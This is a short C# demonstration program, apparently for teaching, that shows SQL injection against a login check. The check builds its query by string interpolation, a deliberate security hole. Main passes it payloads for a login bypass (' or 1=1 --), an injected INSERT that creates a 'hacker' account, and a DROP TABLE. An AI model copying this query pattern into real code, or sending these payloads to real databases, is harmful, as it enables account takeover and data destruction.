using Microsoft.Data.SqlClient;
using System;
using System.Data.SqlClient;


namespace SqlInjection
{
    class Program
    {
        public static bool IsPasswordValid(string username, string password)
        {
            var dbConnection = "Data Source=.;Database=Test;Integrated Security=true;";
            SqlConnection con = new SqlConnection(dbConnection);
            con.Open();
            string sql =
                $"SELECT COUNT(*) FROM Users " +
                $"WHERE Username = '{username}' AND " +
                $"PasswordHash = '{password}'";
            SqlCommand cmd = new SqlCommand(sql, con);
            int matchedUsersCount = (int)cmd.ExecuteScalar();
            con.Close();
            return matchedUsersCount > 0;
        }
        static void Main(string[] args)
        {
            bool normalLogin = IsPasswordValid("peter", "qwerty123");

            Console.WriteLine(normalLogin);

            bool sqlInjectedLogin = IsPasswordValid(" ' or 1=1 --", "qwerty123");

            Console.WriteLine(sqlInjectedLogin);

            bool sqlInjectedLogin2 = IsPasswordValid(" ' or 1=1 --", " ' or 1=1 --");

            Console.WriteLine(sqlInjectedLogin2);

            bool evilHackerCreatesNewUser = IsPasswordValid("' INSERT INTO Users VALUES('hacker','') --","qwerty123");

            Console.WriteLine(evilHackerCreatesNewUser);

            bool evilHackerDropDatabase = IsPasswordValid("'; DROP TABLE Test; --", "qwerty123");

            Console.WriteLine(evilHackerDropDatabase);
        }

    }
}
